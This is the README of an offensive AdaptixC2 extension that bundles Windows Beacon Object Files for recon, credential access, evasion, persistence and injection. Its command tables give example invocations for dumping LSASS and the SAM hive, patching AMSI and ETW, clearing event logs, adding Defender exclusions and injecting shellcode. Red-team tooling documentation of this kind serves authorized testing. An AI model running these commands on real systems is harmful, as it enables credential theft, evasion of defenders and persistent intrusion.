# AdaptixBOFKit

A self-contained [AdaptixC2](https://github.com/Adaptix-Framework/AdaptixC2) extension
that implements **109 Windows x64 BOFs** (**140 registered commands**, including
aliases) across the kill chain: situational awareness, network/AD enumeration,
credential access, Kerberos key derivation, privilege escalation, defense
evasion, persistence and post-exploitation.

The BOFs are original, CRT-free C implementations that use Adaptix's
`DLL$Function` import convention and only the Beacon APIs documented as
supported by Adaptix. They are compiled to position-independent x64 COFF
objects and registered through an AxScript extension.

Coverage is tracked in [`COVERAGE.md`](COVERAGE.md): 114 native, 18 partially
native, 109 upstream-only (heavy projects such as nanodump, Kerbeus, DCSync,
ADCS, CLR hosting, SQL-BOF and BYOVD).

---

## Contents

```
AdaptixBOFKit/
├── AdaptixBOFKit.axs        # AxScript extension (command registration)
├── COVERAGE.md              # coverage map -> native command or upstream
├── Makefile                 # x64 COFF build
├── build.sh                 # convenience wrapper
├── include/
│   ├── beacon.h             # Adaptix-supported Beacon API surface
│   ├── bofdefs.h            # DLL$Function declarations
│   ├── helpers.h            # CRT-free string/memory/format helpers
│   └── ldaphelpers.h        # LDAP bind / rootDSE helpers
├── src/                     # 109 BOF sources (one go() per file)
└── _bin/                    # generated: <name>.x64.o
```

---

## Build

Requirements:

```bash
sudo apt install gcc-mingw-w64-x86-64 binutils-mingw-w64-x86-64 make
```

Build everything:

```bash
./build.sh
```

or:

```bash
make -j$(nproc)
```

Each `src/<name>.c` produces `_bin/<name>.x64.o`. The objects are stripped and
contain no CRT imports; every external call resolves through
`KERNEL32$...`, `ADVAPI32$...`, `NETAPI32$...`, `IPHLPAPI$...`, `WLDAP32$...`, etc.

---

## Install / load in Adaptix

1. Copy this directory somewhere the Adaptix client can read (the client
   sandbox must be able to access `_bin/`).
2. In the client: **Main menu → AxScript → Script manager → Load new**.
3. Select `AdaptixBOFKit.axs`.
4. Select a Beacon agent and run the new commands. BOFs run **inside** the
   agent, single-threaded and blocking. A crash takes the agent with it.

The extension registers command groups:

| Group | Commands |
|---|---|
| `AdaptixBOFKit-Recon` (46) | `whoami`, `env`, `ipconfig`, `arp`, `netstat`, `routeprint`, `uptime`, `listpipes`, `drives`, `locale`, `resources`, `windowlist`, `listmods`, `sessions`, `dir`, `proclist`, `services`, `drivers`, `useridletime`, `sessioninfo`, `regqueryrec`, `auditpol`, `findmodule`, `filterdrivers`, `scenum`, `regsession`, `edrrecon`, `enumsysmon`, `whereami`, `enumrwx`, `vulndrivers`, `enumdotnet`, `safeharbor`, `enumdrives`, `enumlib`, `cacls`, `geolocation`, `evtxsearch`, `finduserhooks`, `enumhandles`, `EnumHandles`, `processhandles`, `ProcessListHandles`, `killprocess`, `vssenum`, `wfpenum` |
| `AdaptixBOFKit-Network` (17) | `portscan`, `nslookup`, `netshares`, `netview`, `netuse`, `netuse-list`, `nettime`, `netloggedon`, `netsession`, `listdns`, `probe`, `smbinfo`, `enumwebclient`, `portscanbof`, `netsession2`, `netuse_add`, `nbtscan` |
| `AdaptixBOFKit-AD` (20) | `netuser`, `netlocalgroups`, `netlocalgroupmembers`, `domaingroups`, `netgroupmembers`, `passwordpolicy`, `domaininfo`, `ldapsearch`, `addmachineaccount`, `lapsdump`, `netgrouplist`, `netgrouplistmembers`, `netgrouplistmembers2`, `netlocalgrouplist`, `netlocalgrouplistmembers`, `get_password_policy`, `adcs_enum`, `adcs_enum_com`, `adcs_enum_com2`, `ldapsecuritycheck` |
| `AdaptixBOFKit-Creds` (13) | `credman`, `wifi`, `autologon`, `procdump`, `regsave`, `dpapissystem`, `certdump`, `clipboard`, `notethief`, `klist`, `kerbhash`, `dumpwifi`, `wifipasswords` |
| `AdaptixBOFKit-Privesc-Evasion` (14) | `tokenpriv`, `uacstatus`, `unhook`, `etwpatch`, `amsipatch`, `hidefile`, `cleareventlog`, `add-exclusion`, `enableefs`, `blindeventlog`, `enumexclusions`, `delexclusion`, `get_priv`, `startwebclient` |
| `AdaptixBOFKit-Persistence` (21) | `regquery`, `regset`, `regdelete`, `runkey`, `svc-create`, `svc-delete`, `sc-config`, `sc-start`, `sc-stop`, `schtasksenum`, `schtasksquery`, `schtaskscreate`, `schtasksdelete`, `schtasksrun`, `AddTaskScheduler`, `DelTaskScheduler`, `comhunter`, `trustme`, `addlocalcert`, `addfirewallrule`, `lnkgenerator` |
| `AdaptixBOFKit-Post` (9) | `inject`, `hashfile`, `bof-download`, `screenshot`, `enumfiles`, `md5`, `sha1`, `sha256`, `executesession` |

All commands are registered for the `beacon` agent on Windows, all listeners.

---

## Command reference

### Recon / situational awareness

| Command | Example | Notes |
|---|---|---|
| `whoami` | `whoami` | User, SID, elevation, groups, token privileges |
| `env` | `env` | Process environment block |
| `ipconfig` | `ipconfig` | IPv4 adapters, gateways, DNS servers |
| `arp` | `arp` | IPv4 ARP table |
| `netstat` | `netstat` | TCP/UDP endpoints and states |
| `routeprint` | `routeprint` | IPv4 routing table |
| `uptime` | `uptime` | Current/boot UTC time and uptime |
| `listpipes` | `listpipes` | Named pipes |
| `drives` / `enumdrives` | `drives` | Drive letters, types, total/free MB |
| `locale` | `locale` | System/user locale and codepages |
| `resources` | `resources` | Memory, CPU, disk C: |
| `windowlist` | `windowlist` | Visible top-level windows + PID |
| `listmods` / `enumlib` | `listmods 1234` | Modules in a process (`0` = current) |
| `sessions` | `sessions` | WTS/RDP sessions, users and clients |
| `dir` | `dir C:\Windows /s` | Directory listing, optional recursive |
| `proclist` | `proclist` | PID, PPID, threads, full image path |
| `services` | `services` | Win32 services, state and PID |
| `drivers` | `drivers` | Kernel drivers registered with SCM |
| `useridletime` | `useridletime` | Seconds since last keyboard/mouse input |
| `sessioninfo` | `sessioninfo` | LSA logon session, type, SID, LUID |
| `regqueryrec` | `regqueryrec HKLM SOFTWARE\Test 3` | Recursive registry dump |
| `auditpol` | `auditpol` | Advanced audit policy subcategories |
| `findmodule` | `findmodule csagent.dll` | Processes with a module loaded |
| `filterdrivers` | `filterdrivers` | Filesystem minifilters (Sysmon, AV) |
| `scenum` | `scenum WinDefend` | One service in detail, or all services |
| `regsession` | `regsession` | Loaded user hives from `HKEY_USERS` |
| `edrrecon` | `edrrecon` | Known EDR/AV service + driver names |
| `enumsysmon` | `enumsysmon` | Sysmon service, driver and config path |
| `whereami` | `whereami` | PID/PPID, session, user, integrity, CWD |
| `enumrwx` | `enumrwx 1234` | RWX memory regions in a process |
| `vulndrivers` | `vulndrivers` | Drivers matching known BYOVD names |
| `enumdotnet` | `enumdotnet` | Processes with the CLR loaded |
| `safeharbor` | `safeharbor` | Candidate low-noise injection targets |
| `cacls` | `cacls C:\Windows\System32` | Owner, DACL principals and access masks |
| `geolocation` | `geolocation` | Region/country/timezone via GeoID (offline) |
| `evtxsearch` | `evtxsearch Security "*[System[(EventID=4624)]]" 5` | XPath event log query, renders XML |
| `finduserhooks` | `finduserhooks ntdll.dll` | Hook heuristics on export prologues |
| `enumhandles` / `EnumHandles` | `enumhandles` | Handle count per process |
| `processhandles` / `ProcessListHandles` | `processhandles 1234` | Handle value, type index and access |
| `killprocess` | `killprocess 1234` | Terminate a process |
| `vssenum` | `vssenum list` | Shadow copies (`providers` for providers) |
| `wfpenum` | `wfpenum all` | WFP filters and sublayers |

### Network

| Command | Example | Notes |
|---|---|---|
| `portscan` / `portscanbof` | `portscan 10.0.0.5 22,80,443,8000-8100` | Non-blocking TCP connect scan (500 ms) |
| `nslookup` | `nslookup corp.local -t A -s 10.0.0.10` | A/AAAA/CNAME/MX/NS/PTR/TXT/SRV/SOA/ANY |
| `netshares` | `netshares 10.0.0.5` | SMB shares via `NetShareEnum` |
| `netview` | `netview CORP` | Domain computer list via `NetServerEnum` |
| `netuse` / `netuse_add` | `netuse \\10.0.0.5\C$ CORP\user pass` | Map a remote share |
| `netuse-list` | `netuse-list` | List mapped network resources |
| `nettime` | `nettime 10.0.0.5` | Remote clock, timezone and uptime |
| `netloggedon` | `netloggedon 10.0.0.5` | Users logged on locally/remotely |
| `netsession` / `netsession2` | `netsession 10.0.0.5` | SMB sessions on a machine |
| `listdns` | `listdns` | DNS client resolver cache |
| `probe` | `probe 10.0.0.5 445` | Single TCP port check |
| `smbinfo` | `smbinfo 10.0.0.5` | Workstation/domain/OS info |
| `enumwebclient` | `enumwebclient 10.0.0.5` | WebClient (WebDAV) service state |
| `nbtscan` | `nbtscan 10.0.0.5,10.0.0.6` | NetBIOS node status names and services |

### AD / accounts

| Command | Example | Notes |
|---|---|---|
| `netuser` | `netuser administrator CORP` | `USER_INFO_3` details |
| `netlocalgroups` / `netlocalgrouplist` | `netlocalgroups 10.0.0.5` | Local groups |
| `netlocalgroupmembers` | `netlocalgroupmembers Administrators` | Local group members |
| `domaingroups` / `netgrouplist` | `domaingroups CORP` | Domain global groups |
| `netgroupmembers` | `netgroupmembers "Domain Admins" CORP` | Domain group members |
| `passwordpolicy` / `get_password_policy` | `passwordpolicy CORP` | Password and lockout policy |
| `domaininfo` | `domaininfo` | Join status, FQDN, DC |
| `ldapsearch` | `ldapsearch (objectClass=user) cn,sAMAccountName` | Generic LDAP search |
| `addmachineaccount` | `addmachineaccount EVILPC01` | Add a computer object over LDAP |
| `lapsdump` | `lapsdump` | Read `ms-Mcs-AdmPwd` from AD |
| `regsession` | `regsession` | Logged-on SIDs (BOFHound input) |
| `adcs_enum` | `adcs_enum all` | Local CAs, templates, enrollment services, ESC1 hints |
| `adcs_enum_com` / `adcs_enum_com2` | `adcs_enum_com templates` | Aliases of `adcs_enum` |
| `ldapsecuritycheck` | `ldapsecuritycheck` | LDAP signing and channel-binding verdict |

### Credentials / Kerberos

| Command | Example | Notes |
|---|---|---|
| `credman` | `credman` | Windows Credential Manager entries |
| `wifi` / `dumpwifi` / `wifipasswords` | `wifi` | Wireless profiles and plaintext keys |
| `autologon` | `autologon` | Winlogon `DefaultPassword` etc. |
| `procdump` | `procdump 644 C:\Temp\lsass.dmp` | `MiniDumpWriteDump` (full memory) |
| `regsave` | `regsave HKLM SAM C:\Temp\sam.hive` | Save a hive with `SeBackupPrivilege` |
| `dpapissystem` | `dpapissystem` | Read the `DPAPI_SYSTEM` LSA secret |
| `certdump` | `certdump user` | Certificates + SHA1 thumbprints |
| `clipboard` | `clipboard` | Current clipboard text |
| `notethief` | `notethief` | Text from open Notepad windows |
| `klist` | `klist` | Cached Kerberos tickets |
| `kerbhash` | `kerbhash Password123 alice CORP.LOCAL` | RC4 + AES128/192/256 keys |

### Privilege / evasion

| Command | Example | Notes |
|---|---|---|
| `tokenpriv` / `get_priv` | `tokenpriv SeDebugPrivilege` | List privileges or enable one |
| `uacstatus` | `uacstatus` | UAC registry settings |
| `unhook` | `unhook` | Restore ntdll executable sections from disk |
| `etwpatch` | `etwpatch` | Patch `ntdll!EtwEventWrite` |
| `amsipatch` | `amsipatch` | Patch `amsi!AmsiScanBuffer` |
| `hidefile` | `hidefile C:\Temp\x.exe` | Hidden + system attributes |
| `cleareventlog` | `cleareventlog` | Clear Application/System/Security |
| `add-exclusion` | `add-exclusion C:\Temp` | Defender path exclusion (admin) |
| `enumexclusions` | `enumexclusions` | List all Defender exclusions |
| `delexclusion` | `delexclusion paths C:\Temp` | Remove an exclusion |
| `enableefs` | `enableefs` | Start the EFS service |
| `blindeventlog` | `blindeventlog suspend` | Suspend/resume EventLog threads |

### Registry / persistence

| Command | Example | Notes |
|---|---|---|
| `regquery` | `regquery HKLM SOFTWARE\... Run` | Enumerate or query a value |
| `regset` | `regset HKCU Software\Test value data` | Create/set `REG_SZ` |
| `regdelete` | `regdelete HKCU Software\Test value` | Delete value, or empty key |
| `runkey` | `runkey Updater C:\Users\Public\u.exe` | `HKCU\...\Run` persistence |
| `svc-create` | `svc-create Updater C:\Users\Public\u.exe` | Create + start service |
| `svc-delete` | `svc-delete Updater` | Delete service |
| `sc-config` | `sc-config Spooler disabled` | Change a service start type |
| `sc-start` | `sc-start Spooler` | Start a service |
| `sc-stop` | `sc-stop Spooler` | Stop a service |
| `schtasksenum` | `schtasksenum` | Tasks in all folders, hidden included |
| `schtasksquery` | `schtasksquery \Microsoft\Windows\Defrag\ScheduledDefrag` | Task state and full XML |
| `schtaskscreate` / `AddTaskScheduler` | `schtaskscreate Updater C:\Windows\System32\cmd.exe /c calc.exe` | Logon-triggered task via XML |
| `schtasksdelete` / `DelTaskScheduler` | `schtasksdelete Updater` | Delete a task |
| `schtasksrun` | `schtasksrun Updater` | Start a task on demand |
| `comhunter` | `comhunter find` | Find hijackable CLSIDs; `add`, `remove`, `treatas` |
| `trustme` | `trustme list` | Trust-provider register/unregister (admin, noisy) |
| `addlocalcert` | `addlocalcert machine CN=AdaptixBOFKit` | Create self-signed cert in `MY` |
| `addfirewallrule` | `addfirewallrule add AdaptixC2 443 tcp allow` | Add/remove/list firewall rules |
| `lnkgenerator` | `lnkgenerator C:\Users\Public\Update.lnk C:\Windows\System32\cmd.exe /c calc.exe` | Create a `.lnk` shortcut |
| `startwebclient` | `startwebclient` | Start the WebClient (WebDAV) service |

### Post-exploitation / utility

| Command | Example | Notes |
|---|---|---|
| `inject` | `inject 1234 C:\Temp\payload.bin` | Read raw shellcode and remote-inject |
| `hashfile` / `md5` / `sha1` / `sha256` | `sha256 C:\Windows\System32\ntdll.dll` | MD5/SHA1/SHA256 via BCrypt |
| `bof-download` | `bof-download C:\Temp\out.txt` | Queue through Adaptix downloads |
| `screenshot` | `screenshot C:\Temp\screen.bmp` | Desktop capture to 32-bit BMP |
| `enumfiles` | `enumfiles C:\Users *.txt password` | Recursive name/content search |
| `executesession` | `executesession 2 C:\Windows\System32\cmd.exe` | Launch in another session via WTS token |

---

## Coverage

[`COVERAGE.md`](COVERAGE.md) contains a row-by-row coverage map for all **241**
rows. The short version:

- **Native (114 rows):** recon, networking, account/AD enumeration, LDAP,
  registry, services, scheduled tasks, VSS, ADCS, WFP, handle introspection,
  credential-manager, DPAPI secret, certificate, clipboard,
  Kerberos ticket/key, injection, hashing, Defender, event log and file
  utilities, COM/trust-provider persistence, firewall rules and shortcuts.
- **Partially native (18 rows):** `tasklist`, `EnumWSC`, `EnumSecProducts`,
  `SafeHarbor`, `SilenceSysmon`, `GeoLocation_BOF`,
  `ExecuteCrossSession`, `TrustMeBOF`, LDAP/OSEP suites, etc.
- **Upstream (109 rows):** LSASS dumping suites (nanodump, PPLDump, WerDump,
  GhostKatz), Kerberos/Rubeus ports, DCSync, ADCS request/exploit chains, CLR
  hosting, PoolParty and other injection families, SQL-BOF, BYOVD,
  clipboard-history/browser credential thieves, and similar multi-file
  projects.

For the upstream rows use the **official Adaptix Extension-Kit**, which already
packages and maintains them for Adaptix:

```bash
git clone https://github.com/Adaptix-Framework/Extension-Kit
cd Extension-Kit && make
```

Load `extension-kit.axs` alongside (or instead of) this extension. It covers:

- AD: `adwssearch`, `ldapsearch`, `readlaps`, `DCSync-BOF`, `Kerbeus-BOF`
  (`asktgt`, `asktgs`, `kerberoasting`, `ptt`, `klist`, `tgtdeleg`, …),
  `SQL-BOF`, ADCS, BadTakeover, RelayInformer
- Credentials: `nanodump`, `lsadump`, `hashdump`, `credman`, `cookie-monster`,
  `UnderlayCopy`, `askcreds`, `get-netntlm`
- Elevation: `getsystem`, Potato/PrintSpoofer, UAC bypasses
- Execution: `execute-assembly`, `No-Consolation`
- Injection: `inject-sec`, `inject-poolparty`, `inject-cfg`
- Lateral movement: `psexec`, `smbexec`, `wmiexec`, `winrm`, `scshell`, MSSQL
- Process/Postex: `nanodump`, `pshistory`, `taskhound`, `sauroneye`, `shadow`

Some command names overlap between the two extensions (for example `whoami`,
`env`, `ipconfig`, `klist`). Load one or the other if you want a single
definition per name, or keep both and use the command description to
distinguish them.

### Not implemented here

`BeaconDataPtr`, `BeaconSpawnTemporaryProcess`, `BeaconInjectProcess`,
`BeaconVirtualAlloc*`, and the other APIs in Adaptix's "unsupported" list are
intentionally unused. Where functionality required them (for example
fork-and-run injection or CLR hosting), this pack does not pretend to provide
it.

---

## Writing your own BOF for this pack

1. Add `src/name.c` with a `void go(char *args, int alen)` entry point.
2. Include `beacon.h`, `bofdefs.h`, `helpers.h`.
3. Call Win32 through `DLL$Function` names. Add the declaration to
   `include/bofdefs.h` if it is missing.
4. Parse arguments with `BeaconDataParse` / `BeaconDataExtract` /
   `BeaconDataInt`.
5. Print with `BeaconPrintf(CALLBACK_OUTPUT, ...)`.
6. Add a command to `AdaptixBOFKit.axs` and register it in a group.

Minimal example:

```c
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

void go(char *args, int alen)
{
    datap p;
    char *who;
    int len = 0;

    if (!args || alen <= 0) return;
    BeaconDataParse(&p, args, alen);
    who = BeaconDataExtract(&p, &len);
    BeaconPrintf(CALLBACK_OUTPUT, "hello %s\n", who ? who : "world");
}
```

```js
var cmd_hello = ax.create_command("hello", "Say hello", "hello world");
cmd_hello.addArgString("who", true, "Name");
cmd_hello.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let params = ax.bof_pack("cstr", [parsed_json["who"]]);
    let path = ax.script_dir() + "_bin/hello." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${path}" ${params}`, "BOF: hello");
});
```

---

## Safety notes

- BOFs run synchronously in the Beacon process. Long loops and blocking
  network calls delay every other task. `portscan` uses a 500 ms per-port
  timeout; scan small ranges or expect delays.
- `unhook`, `etwpatch`, `amsipatch`, `cleareventlog`, `add-exclusion`,
  `blindeventlog`, `svc-create`, `procdump`, `regsave`, `dpapissystem`,
  `inject`, `killprocess` and `executesession` are noisy/high-impact. Test in
  a lab.
- `trustme`, `comhunter`, `addlocalcert`, `schtaskscreate`, `addfirewallrule`
  and `lnkgenerator` change system or user state. Record the exact values
  (GUID, task name, rule name, shortcut path) and clean up afterwards.
  `trustme` writes HKLM, is loaded into many processes and should be treated
  as a loud, last-resort persistence test.
- `vssenum` and `wfpenum` usually need admin; `schtaskscreate`/`delete` need
  write access to the target task folder. `addlocalcert machine` needs admin.
- `evtxsearch` renders up to 200 events per call; large XPath queries can be
  slow inside the agent. `wfpenum` limits output to 400 filters.
- `procdump` on LSASS needs an elevated/SYSTEM context and produces a large
  file; `MiniDumpWithFullMemory` is intentionally used.
- `regsave` and `dpapissystem` require administrator/SYSTEM; failures are
  reported by NTSTATUS/Win32 code.
- `ldapsearch`, `addmachineaccount`, `lapsdump`, `klist` and `kerbhash` run
  with the current token; `kerbhash` prints derived keys, treat output as a
  secret.
- `wifi` plaintext key recovery depends on OS version, privileges and the
  profile's `protected` flag.
- `bof-download` buffers the whole file in the agent process (max 128 MB).
- Always build from source and review before running on a target.

---

## License

MIT for the code in this repository. The Adaptix name and BOF API belong to
the Adaptix Framework project. The optional official Extension-Kit is GPLv3
and remains under its own license.
